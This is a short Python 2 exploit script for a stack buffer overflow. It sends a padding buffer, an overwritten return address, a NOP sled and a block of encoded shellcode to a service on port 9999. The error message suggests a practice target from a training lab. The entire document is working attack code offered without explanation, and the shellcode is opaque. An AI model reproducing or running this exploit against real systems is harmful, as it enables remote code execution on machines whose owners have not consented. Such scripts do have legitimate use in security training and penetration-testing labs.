#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

nops = "\x90" * 16

shellcode = ""
shellcode += "\xbd\x3b\xe1\x23\xaf\xd9\xf6\xd9\x74\x24\xf4\x5a"
shellcode += "\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x6a\x0e\x03\x51"
shellcode += "\xef\xc1\x5a\x59\x07\x87\xa5\xa1\xd8\xe8\x2c\x44"
shellcode += "\xe9\x28\x4a\x0d\x5a\x99\x18\x43\x57\x52\x4c\x77"
shellcode += "\xec\x16\x59\x78\x45\x9c\xbf\xb7\x56\x8d\xfc\xd6"
shellcode += "\xd4\xcc\xd0\x38\xe4\x1e\x25\x39\x21\x42\xc4\x6b"
shellcode += "\xfa\x08\x7b\x9b\x8f\x45\x40\x10\xc3\x48\xc0\xc5"
shellcode += "\x94\x6b\xe1\x58\xae\x35\x21\x5b\x63\x4e\x68\x43"
shellcode += "\x60\x6b\x22\xf8\x52\x07\xb5\x28\xab\xe8\x1a\x15"
shellcode += "\x03\x1b\x62\x52\xa4\xc4\x11\xaa\xd6\x79\x22\x69"
shellcode += "\xa4\xa5\xa7\x69\x0e\x2d\x1f\x55\xae\xe2\xc6\x1e"
shellcode += "\xbc\x4f\x8c\x78\xa1\x4e\x41\xf3\xdd\xdb\x64\xd3"
shellcode += "\x57\x9f\x42\xf7\x3c\x7b\xea\xae\x98\x2a\x13\xb0"
shellcode += "\x42\x92\xb1\xbb\x6f\xc7\xcb\xe6\xe7\x24\xe6\x18"
shellcode += "\xf8\x22\x71\x6b\xca\xed\x29\xe3\x66\x65\xf4\xf4"
shellcode += "\x89\x5c\x40\x6a\x74\x5f\xb1\xa3\xb3\x0b\xe1\xdb"
shellcode += "\x12\x34\x6a\x1b\x9a\xe1\x3d\x4b\x34\x5a\xfe\x3b"
shellcode += "\xf4\x0a\x96\x51\xfb\x75\x86\x5a\xd1\x1d\x2d\xa1"
shellcode += "\xb2\x2a\xb9\xa2\x40\x45\xbf\xb4\x55\xc9\x36\x52"
shellcode += "\x3f\xe1\x1e\xcd\xa8\x98\x3a\x85\x49\x64\x91\xe0"
shellcode += "\x4a\xee\x16\x15\x04\x07\x52\x05\xf1\xe7\x29\x77"
shellcode += "\x54\xf7\x87\x1f\x3a\x6a\x4c\xdf\x35\x97\xdb\x88"
shellcode += "\x12\x69\x12\x5c\x8f\xd0\x8c\x42\x52\x84\xf7\xc6"
shellcode += "\x89\x75\xf9\xc7\x5c\xc1\xdd\xd7\x98\xca\x59\x83"
shellcode += "\x74\x9d\x37\x7d\x33\x77\xf6\xd7\xed\x24\x50\xbf"
shellcode += "\x68\x07\x63\xb9\x74\x42\x15\x25\xc4\x3b\x60\x5a"
shellcode += "\xe9\xab\x64\x23\x17\x4c\x8a\xfe\x93\x7c\xc1\xa2"
shellcode += "\xb2\x14\x8c\x37\x87\x78\x2f\xe2\xc4\x84\xac\x06"
shellcode += "\xb5\x72\xac\x63\xb0\x3f\x6a\x98\xc8\x50\x1f\x9e"
shellcode += "\x7f\x50\x0a"

#0x311712f3
buffer = "A" * 524 + "\xf3\x12\x17\x31" + nops + shellcode
try: 
     print "sending evil buffer..." 
     s.connect(('11.11.11.9',9999)) 
     data = s.recv(1024) 
     s.send(buffer + '\r\n') 
     print "\nDone!"

except: 
     print "Count not connect to Brain!"

